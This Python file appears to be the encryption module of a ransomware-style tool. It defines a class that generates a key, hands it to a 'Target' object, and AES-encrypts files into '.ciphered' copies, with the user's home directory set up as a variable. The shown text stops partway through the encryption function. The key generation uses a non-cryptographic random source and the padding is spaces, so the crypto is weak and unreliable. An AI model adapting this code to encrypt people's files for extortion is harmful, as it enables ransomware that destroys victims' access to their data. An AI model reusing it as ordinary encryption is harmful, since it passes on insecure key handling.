#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, string, random, struct, hashlib
from ctypes import *
from Crypto.Cipher import AES
from target.target import Target

__home__ = os.path.expanduser("~")

# The worst encryption method that possibly exist
class Encryption:
    def __init__(self):
        self.target = Target()
        return

    def key_gen(self, size=16, chars=string.ascii_uppercase + string.digits):
        self.key = ''.join(random.choice(chars) for _ in range(size))
        self.target.save_key(self.key)
        return self.key

    def encrypt_file(self, key, in_filename, encrypt_ext_name='.ciphered', out_filename=None, chunksize=64*1024):
        if not out_filename:
            out_filename = in_filename + '.ciphered'

        self.iv = os.urandom(16)
        self.encryptor = AES.new(key, AES.MODE_CBC, self.iv)
        self.filesize = os.path.getsize(in_filename)
        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', self.filesize))
                outfile.write(self.iv)

                while True:
                    self.chunk = infile.read(chunksize)
                    if len(self.chunk) == 0:
                        break
                    elif len(self.chunk) % 16 != 0:
                        self.chunk += b' ' * (16 - len(self.chunk) % 16)

                    outfile.write(self.encryptor.encrypt(self.chunk))
